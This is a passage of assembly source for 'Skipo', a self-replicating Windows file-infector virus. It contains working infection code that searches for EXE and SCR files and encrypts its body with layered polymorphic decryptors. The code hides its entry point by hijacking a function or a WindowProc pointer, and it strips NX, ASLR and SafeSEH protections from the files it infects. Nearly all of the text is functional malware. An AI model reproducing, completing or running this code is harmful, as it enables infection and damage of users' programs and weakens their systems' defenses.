;--------------------------------
    Mov Esi,[Edi].VirusData.EpoPtr
    Movzx Ecx,[Edi].VirusData.NumberOfPolys         ;the counter of polys (very important)
    Movzx Eax,[Esi].EpoData.Characteristics
    ;now we will prepare all polys and create them in memory
    .If Eax==BLOCKS_OF_CODE_EPO
        Push Edi                        ;save it to pop it in the end
        Push Ecx                        ;save it to use ecx freely in the middle of this loop
        Mov Eax,[Esi].EpoData.ProcSize  ;the size of poly
        Sub AddedSize,Eax               ;the size that will be encrypted by the poly
        Push [Esi].EpoData.ProcOffset
        Invoke initPoly, FileHandler,AddedSize,VirtualAddr, PhysicalAddr,[Esi].EpoData.ProcRVA,Esi
        Mov [Edi].VirusData.PolyEngines.PolyPtr,Eax     ;the HeapPtr of the poly
        PushAD
        Invoke Rand, 2
        Inc Eax
        Mov Edx,Eax
        Invoke Eagle,[Edi].VirusData.PolyEngines.PolyPtr,[Esi].EpoData.ProcSize,Edx,VirtualAddr
        PopAD
        Mov Eax,[Edi].VirusData.PolyEngines.PolyPtr
        Movzx Edx,[Eax].RWPolyData.nLocalVars           ;important for pushad at the beginning
        Shl Edx,2                   ;*4
        Mov nLocalVars,Edx
        Mov Ecx,[Edi].VirusData.PolyEngines.PolySize
        Mov Edi,[Edi].VirusData.PolyEngines.PolyPtr
        Lea Esi,[Edi].RWPolyData.Decryptor
        Pop Edi                                 ;the PhysicalAddr that the poly will be placed
        Rep Movsb
        Pop Ecx
        Dec Ecx
        Pop Edi
        Add Edi,SizeOf PolyEngine   ;to jmp to the second poly
    .Else           ;Parameter Injection EPO
        Mov Edx,[Esi].EpoData.ProcOffset    ;the place that we should put the new pointer
        Mov Eax,VirtualAddr                 ;the pointer that we will put
        Mov DWord Ptr [Edx],Eax             ;save it
    .EndIf
    .While Ecx>0
        Push Edi                        ;save it to pop it in the end
        Push Ecx                        ;save it to use ecx freely in the middle of this loop
        Mov Eax,VirtualAddr
        Mov Temp1,Eax                           ;save it temporary
        Mov Eax,[Edi].VirusData.PolyEngines.PolySize        ;if there's an epo this will be the second poly
        Push PhysicalAddr
        Sub AddedSize,Eax                       ;the size that will be encrypted by the poly
        Add VirtualAddr,Eax
        Add PhysicalAddr,Eax                    ;the Virtual and Physical Adrresses of the next poly or the virus
        Invoke initPoly, FileHandler,AddedSize,VirtualAddr,PhysicalAddr,Temp1,0
        Mov [Edi].VirusData.PolyEngines.PolyPtr,Eax     ;save the HeapPtr
        PushAD                                          ;there's a problem in this Proc so let's save the registers
        Invoke Eagle,[Edi].VirusData.PolyEngines.PolyPtr,[Edi].VirusData.PolyEngines.PolySize,0,VirtualAddr
        PopAD
        Mov Ecx,[Edi].VirusData.PolyEngines.PolySize
        Mov Edi,[Edi].VirusData.PolyEngines.PolyPtr
        Lea Esi,[Edi].RWPolyData.Decryptor
        Pop Edi                                 ;the PhysicalAddr that the poly will be placed
        Rep Movsb
        Pop Ecx
        Dec Ecx
        Pop Edi
        Add Edi,SizeOf PolyEngine   ;to jmp to the next poly
    .EndW
    Invoke GetDelta
    Add Eax,Offset VIRUS_START
    Mov Esi,Eax
    Mov Edi,PhysicalAddr
    Invoke GetVirusSize
    Mov Ecx,Eax             ;size of the virus to move it
    Rep Movsb
;-------------------------
;now we will put the data of the epo in the virus
;firstly we will get the delta in the new virus and put everything in ReturnToEpo (in Virus Data )
    Mov Edi,PhysicalAddr        ;the new Delta
    Add Edi,Offset RETURNING_DATA - Offset VIRUS_START  ;the place
    Mov Esi,HeapPtr
    Mov Esi,[Esi].VirusData.EpoPtr
    Movzx Eax,[Esi].EpoData.Characteristics
    Mov [Edi].ReturnData.Characteristics,Al         ;begin setting the data
    ;.If [Esi].EpoData.Characteristics==BLOCKS_OF_CODE_EPO
        Mov Eax,[Esi].EpoData.ProcRVA
        Mov [Edi].ReturnData.ProcRVA,Eax
        Mov Ecx,[Esi].EpoData.ProcSize      ;we put it in ecx not eax (for movsb)
        Mov [Edi].ReturnData.ProcSize,Ecx
        Mov Eax,nLocalVars
        Mov [Edi].ReturnData.nLocals,Eax
        Mov Edx,HeapPtr
        Movzx Eax,[Edx].VirusData.NumberOfPolys
        Mov [Edi].ReturnData.NoOfPolys,Al
        ;now we set everything we will now put the ProcCode in it's place
        Lea Edi,[Edi].ReturnData.ProcCode
        Lea Esi,[Esi].EpoData.ProcCode
        Rep Movsb
    ;.EndIf

;-------------------------
;now we have copied all the decryptor and the virus and do everything that we want we will now begin to encrypt the virus
;now we will get the last poly and encrypt from the last to the first
    Mov Edi,HeapPtr
    Movzx Ecx,[Edi].VirusData.NumberOfPolys
    Dec Ecx
    Mov Eax,SizeOf PolyEngine
    Mul Ecx
    Add Edi,Eax
    Inc Ecx
    .While Ecx>0
        Mov Esi,[Edi].VirusData.PolyEngines.PolyPtr
        Lea Esi,[Esi].RWPolyData.Encryptor
        ;let's do it
        PushAD
        Call Esi
        PopAD
        Dec Ecx
        Sub Edi,SizeOf PolyEngine
    .EndW
    Add Edi,SizeOf PolyEngine
    Mov Esi,[Edi].VirusData.EpoPtr
    Mov Eax,[Esi].EpoData.ProcRVA
    ;Invoke OffsetToRVA, FileHandler,Eax
    Sub Eax,00400000H
    Mov Edi,FileHandler
    Add Edi,[Edi].IMAGE_DOS_HEADER.e_lfanew
    ;remove NX_Combitable & ASLR & SafeSEH from the Characteristics
    And Word Ptr [Edi].IMAGE_NT_HEADERS.FileHeader.Characteristics,0FABFH
    IFDEF _DEBUG_MODE_
        ;.If [Esi].EpoData.Characteristics==BLOCKS_OF_CODE_EPO
            Mov [Edi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint,Eax
        ;.EndIf
    ENDIF
end_of_infect:
    Invoke UnmapViewOfFileAPI, FileHandler
    Invoke CloseHandleAPI,hMap
    Invoke CloseHandleAPI,hFile
    Ret
InfectFile EndP


 ;---------------------------------------------------------------------------------
 ;                                                                                ;
 ;                                      Misc                                      ;
 ;                                                                                ;
 ;---------------------------------------------------------------------------------
;this Proc will try to fix all the RVAs in rsrc section when it will be moved down to find a place for the virus
ResourceFixup Proc Uses Esi Edi Ecx FileHandler:DWord,rsrcOffset:DWord,ResDirectory:DWord,AddedSize:DWord
    Mov Esi,ResDirectory        ;Image Resource Directory that we will search in it for items
    Movzx Ecx,[Esi].IMAGE_RESOURCE_DIRECTORY. NumberOfNamedEntries
    Add Cx,[Esi].IMAGE_RESOURCE_DIRECTORY. NumberOfIdEntries        ;we now have the total numbers of Entries
    Add Esi,SizeOf IMAGE_RESOURCE_DIRECTORY                     ;loop on Entries
    .While Ecx>0
        Mov Eax,[Esi].IMAGE_RESOURCE_DIRECTORY_ENTRY.OffsetToData
        .If Eax & 80000000H         ;is it Resource Directory ?
            And Eax,7FFFFFFFH
            Add Eax,rsrcOffset      ;let's search on it
            Invoke ResourceFixup, FileHandler,rsrcOffset,Eax,AddedSize
        .Else
            Add Eax,rsrcOffset      ;let's search on it
            Mov Edx,Eax             ;save it
            Mov Eax,[Eax].IMAGE_RESOURCE_DATA_ENTRY.OffsetToData
            Add Eax,AddedSize
            Push Eax
            Invoke GetNumOfSections, FileHandler
            Invoke GetSection,FileHandler,Eax
            Mov Edi,Eax
            Pop Eax
            Sub Eax,[Edi].IMAGE_SECTION_HEADER.VirtualAddress
            Add Eax,[Edi].IMAGE_SECTION_HEADER.PointerToRawData
            Add Eax,FileHandler
            .If Eax>rsrcOffset      ;is it in rsrc section ? (most of cases this will return true)
                Mov Eax,[Edx].IMAGE_RESOURCE_DATA_ENTRY.OffsetToData
                Add Eax,AddedSize
                Mov [Edx].IMAGE_RESOURCE_DATA_ENTRY.OffsetToData,Eax
            .EndIf
        .EndIf
        Add Esi,SizeOf IMAGE_RESOURCE_DIRECTORY_ENTRY
        Dec Ecx
    .EndW
    Ret
ResourceFixup EndP

AlignSize Proc Uses Edx Ecx SrcNum:DWord,Alignment:DWord
    ;int 3
    Xor Edx, Edx
    Mov Eax,SrcNum
    Mov Ecx,Alignment
    Push Eax
    Div Ecx
    Pop Eax
    .If !(Edx==0)
        Sub Ecx, Edx
        Add Eax, Ecx
    .EndIf
    Ret
AlignSize EndP
;this Proc get the virus size by getting the code section size
;this way only done in the first generation and the data in [Ebx+ ViusSize] copied from infection to another
;when the virus copied from the first generation to the second this data [Ebx+ ViusSize] also copied with it so
;getting the virus size will only read [Ebx+ ViusSize] and will not see the code section size
GetVirusSize Proc Uses Ecx Edi Esi
    Invoke GetDelta
    Mov Ebx,Eax
    .If DWord Ptr [Ebx+ ViusSize]==0
        Call _@1
_@1:
        Pop Esi
        And Esi,0FFFF0000H
        Invoke GetKernelBase, Esi,20    ;we now get the imagebase let's get the code section
        Invoke GetSection, Eax,1        ;we now get the code section
        Mov Esi,Eax
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
        Mov DWord Ptr [Ebx+ ViusSize],Eax
    .Else
        Mov Eax,DWord Ptr [Ebx+ ViusSize]
    .EndIf
    Ret
GetVirusSize EndP
;this Proc is copied from Iczelion's PE Tutorial 6: Import Table
;surely for fast coding not I can't do it ;)
;"Uses Edi Esi Edx Ecx" this mean that masm will push them at the beginning and pop them at the end
;---
RVAToOffset Proc Uses Edi Esi Edx Ecx pFileMap:DWord,RVA:DWord
    mov esi,pFileMap
    assume esi:ptr IMAGE_DOS_HEADER
    add esi,[esi].e_lfanew
    assume esi:ptr IMAGE_NT_HEADERS
    mov edi,RVA ; edi == RVA
    mov edx,esi
    Add Edx,SizeOf IMAGE_NT_HEADERS
    mov cx,[esi].FileHeader.NumberOfSections
    Movzx Ecx,Cx
    assume edx:ptr IMAGE_SECTION_HEADER
    .while ecx>0    ; check all sections
        .if edi>=[edx].VirtualAddress
            mov eax,[edx].VirtualAddress
            add eax,[edx].SizeOfRawData
            .if edi<eax ; The address is in this section
                mov eax,[edx].VirtualAddress
                sub edi,eax ; edi == difference between the specified RVA and the section's RVA
                mov eax,[edx].PointerToRawData
                add eax,edi ; eax == file offset
                ret
            .endif
        .endif
        add edx,sizeof IMAGE_SECTION_HEADER
        dec ecx
    .endw
    assume edx:nothing
    assume esi:nothing
    mov eax,edi
    ret
RVAToOffset EndP
;this Proc do the reverse .it convert any Offset to RVA
;it's important for Getting the APIs Pointers (in init poly)

OffsetToRVA Proc Uses Edi Esi Edx Ecx lpFileMap:DWord,lpOffset:DWord
    Mov Esi,lpFileMap
    assume esi:ptr IMAGE_DOS_HEADER
    add esi,[esi].e_lfanew
    assume esi:ptr IMAGE_NT_HEADERS
    Mov Edi,lpOffset    ; edi == Offset
    Sub Edi,lpFileMap
    mov edx,esi
    add edx,sizeof IMAGE_NT_HEADERS
    mov cx,[esi].FileHeader.NumberOfSections
    movzx ecx,cx
    assume edx:ptr IMAGE_SECTION_HEADER
    .while ecx>0    ; check all sections
        .If Edi>=[Edx].PointerToRawData
            Mov Eax,[Edx].PointerToRawData
            add eax,[edx].SizeOfRawData
            .if edi<eax ; The address is in this section
                Mov Eax,[Edx].PointerToRawData
                sub edi,eax ; edi == difference between the specified RVA and the section's RVA
                Mov Eax,[Edx].VirtualAddress
                Add Eax,Edi ; eax == file offset
                Add Eax,00400000H
                ret
            .endif
        .endif
        add edx,sizeof IMAGE_SECTION_HEADER
        Dec Ecx
    .EndW
    assume edx:nothing
    Assume Esi:Nothing
    Mov Eax,Edi
    ret
OffsetToRVA endp
;this function get the pointer to the Section Header of section no (nSec)
;return in eax
GetSection Proc Uses Esi Edi Edx FileHandler:DWord,nSec:DWord
    Mov Esi,FileHandler
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    Mov Edi,Esi
    Add Edi,SizeOf IMAGE_NT_HEADERS
    Mov Eax,nSec
    Dec Eax
    Mov Edx, SizeOf IMAGE_SECTION_HEADER
    IMul Edx
    Add Edi, Eax                    ;edi now points to the Section header
    Mov Eax,Edi
    Ret
GetSection EndP
GetNumOfSections Proc Uses Edi Esi FileHandler:DWord
    Xor Eax,Eax
    Mov Esi,FileHandler
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    Mov Ax,[Esi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    Ret
GetNumOfSections EndP
IsPointerWithinRange Proc Uses Esi Edi FileHandler:DWord,lpPointer:DWord
    Mov Esi,FileHandler
    Add Esi,[Esi].IMAGE_DOS_HEADER.e_lfanew
    Invoke GetNumOfSections, FileHandler
    Invoke GetSection, FileHandler,Eax
    Mov Edi,Eax
    Mov Eax,[Edi].IMAGE_SECTION_HEADER.PointerToRawData
    Add Eax,[Edi].IMAGE_SECTION_HEADER.SizeOfRawData        ;get the maximum size in rawData
    Mov Edi,FileHandler
    Add Edi,Eax
    Mov Eax,lpPointer
    .If Eax>Esi && Eax<Edi
        Xor Eax,Eax
    .Else
        Mov Eax,-1  ;error
    .EndIf
    Ret
IsPointerWithinRange EndP
;Get a Random Number
;get a limited number from 0 to MaxNum
;if maxNum == 0 it gives a number with unlimited size (0 to FFFFFFFFh)
Rand Proc Uses Esi Ecx Edx MaxNum:DWord
    Call Rand_Delta
RandomInt:
           DD ?
Rand_Delta:
    Pop Esi                     ;pointing to RandomInt
    Mov Eax, DWord Ptr [Esi]
    .If Eax==0
        rdtsc
        Xor Eax,Ecx
        Mov DWord Ptr [Esi],Eax
    .EndIf
    Push Eax
    Add Eax, 50
    Xor Eax, 04F367C34H
    IMul Eax, 0A5H
    Add Eax, 49
    Mov Ecx, 000004A6H
    Xor Edx, Edx
    Div Ecx
    IMul Eax, 05A37H
    Sub Eax, 6
    Pop Ecx
    ;or ecx,00F000F0h
    ;and eax,0FFF00FFFh
    Xor Eax, Ecx
    Mov DWord Ptr [Esi], Eax
    Xor Edx, Edx
    Mov Ecx,MaxNum
    .If !(MaxNum==0)
        Div Ecx
        Mov Eax, Edx
    .EndIf
    Ret
Rand EndP

 ;---------------------------------------------------------------------------------
 ;                                                                                ;
 ;                                  Virus Data                                    ;
 ;                                                                                ;
 ;---------------------------------------------------------------------------------

DataStart:
 RandomBuffer DB 8 Dup (144)
 PolyDecrypt DB 1024 Dup (144)

 szTitle DB "Skipo v1.00 by T.Degano ", 0
 szMessage DB "Copyright (c) 2009 by Tiberio Degano .", 10, "and all rights reserved to him", 0
 OldEIP DD 00001000H
 ModBase DD ?
 ViusSize DD ?
 ;hFile                 DD ?
 ;hMap                  DD ?
 ;lpFilePointer         DD ?
 CurrentDir DB MAX_PATH Dup (?)
 EXESearch DB "*.EXE", 0
 SCRSearch DB "*.SCR", 0
 MAX_DECRYPTOR Equ 100                                                          ;get write access to the virus body
 buffer DB MAX_DECRYPTOR Dup (90)
 ;Constants:
;    mov edi,12345678h
;    mov ecx,VIRUS_BODY_SIZE
;    mov eax,12345678h
;_@1: xor Dword Ptr[edi],eax
;    add edi,4

;    loop FFFFFFFFh
MAXIMUM_REQUESTED_APIS Equ 17
MAXIMUM_USER32_APIS Equ 3
API_TABLE:
DD 020D17D1H    ;GetCurrentDiresctoryA
DD Offset GetCurrentDirectoryAPI+API_ADDRESS_OFFSET
DD 020D1739H    ;SetCurrentDirectoryA
DD Offset SetCurrentDirectoryAPI+API_ADDRESS_OFFSET
DD 250B0565H    ;FindFirstFileA
DD Offset FindFirstFileAPI+API_ADDRESS_OFFSET
DD 250B05CEH    ;FindNextFileA
DD Offset FindNextFileAPI+API_ADDRESS_OFFSET
DD 011D065DH    ;FindClose
DD Offset FindCloseAPI+API_ADDRESS_OFFSET
DD 20021CCBH    ;CreateFileMappingA
DD Offset CreateFileMappingAPI+API_ADDRESS_OFFSET
DD 331C08E5H    ;MapViewOfFile
DD Offset MapViewOfFileAPI+API_ADDRESS_OFFSET
DD 1603086FH    ;CloseHandle
DD Offset CloseHandleAPI+API_ADDRESS_OFFSET
DD 040107C2H    ;UnmapViewOfFile
DD Offset UnmapViewOfFileAPI+API_ADDRESS_OFFSET
DD 20001E3FH    ;CreateFileA
DD Offset CreateFileAPI+API_ADDRESS_OFFSET
DD 010D0CE8H    ;ReadFile
DD Offset ReadFileAPI+API_ADDRESS_OFFSET
DD 11051B9AH    ;WriteFile
DD Offset WriteFileAPI+API_ADDRESS_OFFSET
DD 07070033H    ;SetFileAttributesA
DD Offset SetFileAttributesAPI+API_ADDRESS_OFFSET
DD 25181DBBH    ;LoadLibraryA
DD Offset LoadLibraryAPI+API_ADDRESS_OFFSET
DD 201A109CH    ;GetTickCount
DD Offset GetTickCountAPI+API_ADDRESS_OFFSET
DD 171D05E8H    ;VirtualAlloc
DD Offset VirtualAllocAPI +API_ADDRESS_OFFSET
DD 00110CEAH    ;VirtualProtect
DD Offset VirtualProtectAPI +API_ADDRESS_OFFSET

U32_TABLE:
DD 320B0A20H  ;MessageBoxA
DD Offset MessageBoxAPI+API_ADDRESS_OFFSET
DD 16130B49H    ;SetWindowLong
DD Offset SetWindowLongAPI +API_ADDRESS_OFFSET
DD 2D0F0EF8H    ;CallWindowProc
DD Offset CallWindowProcAPI +API_ADDRESS_OFFSET

 szUser32   DB "User32.dll",0
Registers DB 20H Dup (00)

RETURNING_DATA:
ReturnFormEpo DB SizeOf ReturnData  Dup (00)

DB 0, 0, 0, 0

 ;-----------------------------------------------------------------------------------
 ;                                                                                  ;
 ;                                   Skipo EPO Engine                               ;
 ;                                                                                  ;
 ;-----------------------------------------------------------------------------------

 ;-=*-=-=*-=-=*-=-=*-=-=*-=-=*-=- Skipo EPO Engine V 1.00 -=*-=-=*-=-=*-=-=*-=-=*-=-=*-=-
;Code:
;-----
EPO Proc Uses Esi Edi Edx Ecx FileHandler:DWord
    Local HeapPtr:DWord
    Local initAddr:DWord
    Local SectionHeader:DWord
    Local nTry:DWord
    Local Dest:DWord
    Local Temp1:DWord
    Local Temp2:DWord

    Mov nTry,0              ;this variable used for saving the number of tries we d to find the proc (if it ==10 so leave and return error)
    Invoke VirtualAllocAPI, 0,SizeOf EpoData,MEM_COMMIT,PAGE_READWRITE
    Mov HeapPtr,Eax         ;Pointer to the data section of the EPO .will be returned at the end of this proc
    ;Jmp last_end
    Invoke Rand,2
;-----------------------------------------------------------------------------------------------
                ;=*-=*-=*-=*-=*-= BLOCKS OF CODE EPO =*-=*-=*-=*-=*-=;
    .If Eax==0
TryAgain:
        Mov Edi,HeapPtr
        Mov [Edi].EpoData.Characteristics,BLOCKS_OF_CODE_EPO
        Invoke GetSection, FileHandler, 1       ;code section (.text)
        Mov SectionHeader,Eax
        Mov Esi,Eax
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.PointerToRawData
        Add Eax,FileHandler
        Mov [Edi].EpoData.ProcOffset,Eax        ;save the section offset here temporary
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.VirtualAddress
        Add Eax,00400000H
        Mov [Edi].EpoData.ProcRVA,Eax           ;it's important for the poly
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
        Mov [Edi].EpoData.ProcSize,Eax          ;save the size (temporary untill we get the proc)
        Invoke Rand, Eax
        Add Eax,[Edi].EpoData.ProcOffset        ;we now have the a reandom address in the code section
        Mov initAddr,Eax                        ;save it
        ;the next loop we will try to find a call to push ebp/mov ebp,esp
        ;we will begin from initAddr and loop on whole code section untill we reach initAddr again
        Mov Esi,Eax ;the init addr
        Inc Esi     ;avoid to be esi==initaddr  (to avoid the loop think we reach the end)
        .While !(Esi==initAddr)
            .If Byte Ptr [Esi]==0E8H        ;is it a call
                Mov Eax,DWord Ptr [Esi+1]   ;if it let's see where it points
                Add Eax,Esi                 ;rel32 of any call == Destination - Source(source after the call ==esi+5)
                Add Eax,5                   ;so Destination== rel32+ Source (esi+5)
                Mov Edx,Eax                 ;save it here
                Sub Eax,[Edi].EpoData.ProcOffset
                .If Eax < [Edi].EpoData.ProcSize    ;is it within in bounds
                    Mov Eax,Edx
                    .If Word Ptr [Eax]== 0FF8BH         ;mov edi,edi
                        Add Eax,2
                    .EndIf
                    .If Byte Ptr [Eax]==55H && Word Ptr [Eax+1]== 0EC8BH        ;is it push ebp/mov ebp,esp
                        ;Mov Eax,Edx
                        Jmp ProcFinded
                    .EndIf
                .EndIf
            .EndIf
            Inc Esi
            Mov Eax,[Edi].EpoData.ProcOffset
            Add Eax,[Edi].EpoData.ProcSize  ;pointer to the end of code section (as offset)
            .If Esi>=Eax                ;if esi reach the end of code section continune from the begining untill reach initAddr
                Mov Esi,[Edi].EpoData.ProcOffset
            .EndIf
        .EndW
        ;nothing found
        Xor Eax,Eax         ;error
        Jmp last_end
ProcFinded:
        Mov [Edi].EpoData.ProcOffset,Eax    ;we now have the proc . we need to disassemble it untill we found leave and ret and test it's size of it begger than 100 bytes
        Lea Esi,[Edi].EpoData.DisasmCode
        Xor Ecx,Ecx                         ;the number of instructions
        Mov Edx,Eax                         ;the pointer to the place where we will disassemble from
        .While !(Byte Ptr [Edx]==0C9H) && !(Byte Ptr [Edx]==05DH)   ;leave/ret or pop ebp/ret
            Invoke hde32_disasm,Edx,Esi
            Mov [Esi].hde32s.ins_addr,Edx   ;save the address of edx
            Mov Eax,FileHandler
            Sub [Esi].hde32s.ins_addr,Eax   ;make it just an offset
            Movzx Eax,[Esi].hde32s.len
            Add Edx,Eax                     ;add the lenth (pointing for the next instruction)
            Add Esi,SizeOf hde32s           ;next table entry
            Inc Ecx                         ;inc the counter
            .If Ecx>100
                Jmp TryAgain                ;it will reach a buffer overflow :)
            .EndIf
        .EndW
        Invoke hde32_disasm,Edx,Esi     ;for leave
        Mov [Esi].hde32s.ins_addr,Edx
        Mov Eax,FileHandler
        Sub [Esi].hde32s.ins_addr,Eax
        Movzx Eax,[Esi].hde32s.len
        Add Edx,Eax
        Add Esi,SizeOf hde32s
        Inc Ecx
        Invoke hde32_disasm,Edx,Esi     ;for ret
        Mov [Esi].hde32s.ins_addr,Edx
        Mov Eax,FileHandler
        Sub [Esi].hde32s.ins_addr,Eax
        Movzx Eax,[Esi].hde32s.len
        Add Edx,Eax
        Add Esi,SizeOf hde32s
        Inc Ecx
        Mov Eax,Edx
        Sub Eax,[Edi].EpoData.ProcOffset
        .If Eax<200
            .If nTry<800
                Inc nTry            ;let's try again
                Jmp TryAgain
            .Else
                Xor Eax,Eax         ;error
                Jmp last_end
            .EndIf
        .EndIf
        .While Byte Ptr [Edx]==0CCH ;for int3 at the end of the proc (in C++ Programs)
            Inc Edx
            Inc Eax
        .EndW
        Dec Eax                     ;from debugging
        Mov [Edi].EpoData.ProcSize,Eax
        Mov [Edi].EpoData.NoOfIns,Ecx
        Mov Eax,[Edi].EpoData.ProcOffset
        Invoke OffsetToRVA, FileHandler,Eax
        Mov [Edi].EpoData.ProcRVA,Eax
        ;now it's the time for copying this proc into ProcCode
        Mov Ecx,[Edi].EpoData.ProcSize
        Mov Esi,[Edi].EpoData.ProcOffset
        Lea Edi,[Edi].EpoData.ProcCode
        Xor Eax,Eax
        Rep Movsb
;-----------------------------------------------------------------------------------------------
                ;=*-=*-=*-=*-=*-= PARAMETER INJECTION EPO =*-=*-=*-=*-=*-=;
    .Else
        Mov Edi,HeapPtr
        Mov [Edi].EpoData.Characteristics,PARAMETER_INJECTION_EPO
        Invoke GetSection, FileHandler, 1       ;code section (.text)
        Mov SectionHeader,Eax
        Mov Esi,Eax
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.PointerToRawData
        Add Eax,FileHandler
        Mov [Edi].EpoData.ProcOffset,Eax        ;save the section offset here temporary
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.VirtualAddress
        Add Eax,00400000H
        Mov [Edi].EpoData.ProcRVA,Eax           ;it's important for the poly
        Mov Eax,[Esi].IMAGE_SECTION_HEADER.SizeOfRawData
        Mov [Edi].EpoData.ProcSize,Eax          ;save the size (temporary untill we get the proc)
        Invoke Rand, Eax
        Add Eax,[Edi].EpoData.ProcOffset        ;we now have the a reandom address in the code section
        Mov initAddr,Eax                        ;save it
        ;the next loop we will try to find a jmp to dword ptr and a pointer to code section
        ;we will begin from initAddr and loop on whole code section untill we reach initAddr again
        Mov Esi,Eax ;the init addr
        Inc Esi     ;avoid to be esi==initaddr  (to avoid the loop think we reach the end)
        .While !(Esi==initAddr)
            .If Word Ptr [Esi]==015FFH      ;is it a jmp dword
                Mov Eax,DWord Ptr [Esi+2]   ;if it let's see where it points
                Sub Eax,00400000H
                Invoke RVAToOffset, FileHandler,Eax
                Add Eax,FileHandler         ;now we have the pointer to the place we want (RegisterClassEx)
                Mov Edx,Eax                 ;save it here
                Invoke IsPointerWithinRange, FileHandler,Eax
                .If Eax==0
                    Mov Eax,Edx             ;restore it
                    Mov Eax,DWord Ptr [Eax]     ;pointer to the pointer of the string
                    Add Eax,2
                    Invoke RVAToOffset, FileHandler,Eax
                    .If !(Eax & 80000000H)      ;not a jmp by ordinal
                        Add Eax,FileHandler
                        Mov Edx,Eax
                        Invoke IsPointerWithinRange, FileHandler,Eax
                        .If Eax==0
                            Mov Eax,Edx
                            .If Byte Ptr [Eax+16]==00   ;the lenth of RegisterClassExA
                                Mov Edx,Eax             ;save it here
                                Invoke APIChecksum,Eax
                                .If Eax==281F2018H || Eax==2814164FH        ;Checksum of RegisterClassExA or RegisterClassA
                                    Mov Eax,Esi
                                    Jmp JmpFinded
                                .EndIf
                            .EndIf
                        .EndIf
                    .EndIf
                .EndIf
            .EndIf
            Inc Esi
            Mov Eax,[Edi].EpoData.ProcOffset
            Add Eax,[Edi].EpoData.ProcSize  ;pointer to the end of code section (as offset)
            .If Esi==Eax                ;if esi reach the end of code section continune from the begining untill reach initAddr
                Mov Esi,[Edi].EpoData.ProcOffset
            .EndIf
        .EndW
        ;nothing found
        Xor Eax,Eax         ;error
        Jmp End_of_glory
JmpFinded:
        Mov Dest,Eax                            ;we will save the destination there
        Mov Eax,DWord Ptr [Esi+2]
        ;now we will search for a pointer to code section in the previous 50 bytes let's try
        Mov Temp1,Esi       ;save it now
        Push Esi
        Sub Esi,100         ;we will search in the previous 50 byte
        Mov Temp2,Esi       ;save the maximum pointer we sould reach
        Pop Esi
        Mov Eax,[Edi].EpoData.ProcRVA
        Mov Edx,Eax
        Add Edx,[Edi].EpoData.ProcSize
        ;now eax-->the begining of the code section and edx-->the end of code section
        .While !(DWord Ptr [Esi]>Eax && DWord Ptr [Esi]<Edx)
Continue:
            Dec Esi
            .If Esi ==Temp2
                Mov Esi,Temp1       ;restore it
                Jmp NothingFound
            .EndIf
        .EndW
        Mov Eax,DWord Ptr [Esi]
        Sub Eax,00400000H
        Invoke RVAToOffset, FileHandler,Eax
        Add Eax,FileHandler
        ;check for push ebp / mov ebp,esp
        .If Word Ptr [Eax]== 0FF8BH         ;mov edi,edi
            Add Eax,2
        .EndIf
        .If !(Byte Ptr [Eax]==55H && Word Ptr [Eax+1]== 0EC8BH)
            Jmp Continue
        .EndIf
        ;we found :)
        Invoke OffsetToRVA, FileHandler,Esi
        ;Add Eax,00400000H
        Jmp CallFinded
NothingFound:
        Inc Esi
        Mov Eax,[Edi].EpoData.ProcOffset
        Add Eax,[Edi].EpoData.ProcSize
        .If Esi==Eax
            Mov Esi,[Edi].EpoData.ProcOffset
        .EndIf
        Xor Eax,Eax         ;error
        Jmp End_of_glory
CallFinded:
        ;we now find the pointer to the WindowProc let's save it
        Mov [Edi].EpoData.ProcOffset,Esi
        Mov [Edi].EpoData.ProcRVA,Eax
        Mov [Edi].EpoData.ProcSize,4
        Mov Eax,DWord Ptr [Esi]
        Mov DWord Ptr [Edi].EpoData.ProcCode,Eax
    .EndIf
    Mov Eax,HeapPtr             ;return the EpoData Structure
    Jmp last_end
End_of_glory:
    Mov nTry,0
    Jmp TryAgain                ;if Parameter Injection EPO failed so jmp to blocks of code EPO
last_end:
    Ret
EPO EndP

Virus_End:
End Skipo



